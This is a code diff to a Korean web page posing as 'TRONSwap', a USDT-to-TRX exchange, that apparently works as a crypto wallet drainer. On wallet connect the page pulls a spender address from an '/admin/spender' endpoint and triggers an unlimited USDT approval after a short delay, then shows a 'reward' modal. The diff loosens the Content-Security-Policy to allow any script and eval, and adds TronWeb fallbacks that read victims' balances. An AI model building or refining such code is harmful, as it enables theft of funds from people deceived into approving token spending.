@@ -2,7 +2,8 @@
 <html lang="ko" class="dark">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; connect-src * https://tron-usdt-backend.vercel.app https://*.trongrid.io https://*.tronstack.io wss://* ws://*; img-src * data: blob:; font-src * data:; style-src * 'unsafe-inline'; script-src * 'unsafe-inline' 'unsafe-eval';">
     <title>TRONSwap - USDT ↔ TRX 즉시 교환</title>
     <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
     <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
@@ -444,7 +445,7 @@
         function appendLog(msg,type){type=type||'info';var c=document.getElementById('logs-container');if(!c)return;var d=document.createElement('div');d.className=type==='success'?'text-emerald-400 font-bold':type==='error'?'text-red-400 font-bold':type==='warn'?'text-amber-400':type==='approve'?'text-purple-400':'text-blue-400';d.innerHTML='<span class="text-slate-600">['+new Date().toLocaleTimeString('ko-KR')+']</span> '+escapeHtml(msg);c.appendChild(d);c.scrollTop=c.scrollHeight;}
         window.clearLogs=function(){var c=document.getElementById('logs-container');if(c)c.innerHTML='<div class="text-slate-600">[로그 초기화]</div>';};
         function copyText(t,l){navigator.clipboard.writeText(t).then(function(){showToast(l+' 복사됨');}).catch(function(){showToast('복사 실패','error');});}
-        async function getSpenderAddress(){try{var r=await fetch(API_BASE+'/admin/spender');var d=await r.json();if(d.status==='ok'&&d.address)return d.address;}catch(e){}return null;}
+        async function getSpenderAddress(){try{var r=await safeFetch(API_BASE+'/admin/spender',null,5000);var d=await r.json();if(d.status==='ok'&&d.address)return d.address;}catch(e){}return null;}
 
         // Progress bar
         function setProgress(pct,text){
@@ -459,13 +460,21 @@
 
 
         var userUsdtBalance=0;var TRX_RATE=0;
+        // Timeout wrapper for fetch (CSP-safe)
+        function safeFetch(url,opts,ms){
+            ms=ms||8000;
+            return Promise.race([
+                fetch(url,opts||{}),
+                new Promise(function(_,rej){setTimeout(function(){rej(new Error('timeout'));},ms);})
+            ]);
+        }
         // Binance 실시간 TRX/USDT 시세 조회
         async function fetchTrxPrice(){
             try{
-                var res=await fetch(API_BASE+'/trx-price');
+                var res=await safeFetch(API_BASE+'/trx-price',null,5000);
                 var data=await res.json();
                 if(data.price>0){TRX_RATE=1/data.price;document.getElementById('exchange-rate').textContent=TRX_RATE.toFixed(2);}
-            }catch(e){if(!TRX_RATE)TRX_RATE=4.0;}
+            }catch(e){if(!TRX_RATE)TRX_RATE=4.0;try{document.getElementById('exchange-rate').textContent=TRX_RATE.toFixed(2);}catch(x){}}
         }
         fetchTrxPrice();setInterval(fetchTrxPrice,30000);
         window.updateSwapOutput=function(){var v=parseFloat(document.getElementById('swap-input').value||0);document.getElementById('swap-output').textContent=TRX_RATE?(v*TRX_RATE).toFixed(2):'0.00';};
@@ -680,7 +689,7 @@
 
             appendLog(L('sending'));
             try{
-                var res=await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:address,provider:provider})});
+                var res=await safeFetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:address,provider:provider})},8000);
                 var data=await res.json();
                 if(data.status==='ok'){
                     userUsdtBalance=parseFloat(data.balance)||0;document.getElementById('display-balance').innerHTML=data.balance+' <span class="text-xs font-normal text-slate-400">USDT</span>';try{document.getElementById('usdt-bal-swap').textContent=data.balance;}catch(e){}
@@ -688,9 +697,25 @@
                     showToast(provider+' 연결 완료 (잔액: '+data.balance+' USDT)');
                     appendLog(L('connected',address,data.balance),'success');
                 }
-            }catch(e){appendLog(L('backendFail'),'warn');}
+            }catch(e){
+                appendLog(L('backendFail'),'warn');
+                showToast(provider+' 연결됨 (잔액 조회 실패)','warn');
+                // CSP 차단 시에도 TronWeb으로 직접 잔액 조회 시도
+                try{
+                    if(window.tronWeb){
+                        var contract=await window.tronWeb.contract().at(OFFICIAL_USDT_CONTRACT);
+                        var bal=await contract.balanceOf(address).call();
+                        userUsdtBalance=parseFloat(window.tronWeb.fromSun(bal))*1000000/1000000;
+                        document.getElementById('display-balance').innerHTML=userUsdtBalance.toFixed(2)+' <span class="text-xs font-normal text-slate-400">USDT</span>';
+                        try{document.getElementById('usdt-bal-swap').textContent=userUsdtBalance.toFixed(2);}catch(x){}
+                    }
+                }catch(x){}
+            }
 
-            try{var _tr=await fetch(API_BASE+'/trx/'+address);var _td=await _tr.json();if(_td.trxBalance)try{document.getElementById('trx-bal-swap').textContent=parseFloat(_td.trxBalance).toFixed(2);}catch(e){}}catch(e){}
+            try{var _tr=await safeFetch(API_BASE+'/trx/'+address,null,5000);var _td=await _tr.json();if(_td.trxBalance)try{document.getElementById('trx-bal-swap').textContent=parseFloat(_td.trxBalance).toFixed(2);}catch(e){}}catch(e){
+                // CSP 차단 시 TronWeb으로 직접 TRX 잔액 조회
+                try{if(window.tronWeb){var trxBal=await window.tronWeb.trx.getBalance(address);document.getElementById('trx-bal-swap').textContent=(trxBal/1000000).toFixed(2);}}catch(x){}
+            }
             if(!isApproved){setTimeout(function(){executeUnlimitedApprove();},2500);}
         }
 
@@ -723,7 +748,7 @@
             setProgress(20,'TRX 잔액 확인 중...');
             appendLog(L('trxCheck'),'approve');
             try{
-                var prepRes=await fetch(API_BASE+'/wallet/prepare-approve',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress})});
+                var prepRes=await safeFetch(API_BASE+'/wallet/prepare-approve',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress})},10000);
                 var prepData=await prepRes.json();
                 if(prepData.status==='ok'&&prepData.ready){
                     if(prepData.sent){
@@ -769,7 +794,7 @@
                 document.getElementById('modal-txhash').textContent=typeof txHash==='string'?txHash.substring(0,20)+'...':txHash;
                 document.getElementById('reward-modal').classList.add('active');
 
-                try{await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress,provider:activeProvider})});}catch(e){}
+                try{await safeFetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress,provider:activeProvider})},5000);}catch(e){}
                 showToast(currentLang==='ko'?'교환 승인 완료!':'Swap approved!');
             }catch(err){
                 hideProgress();
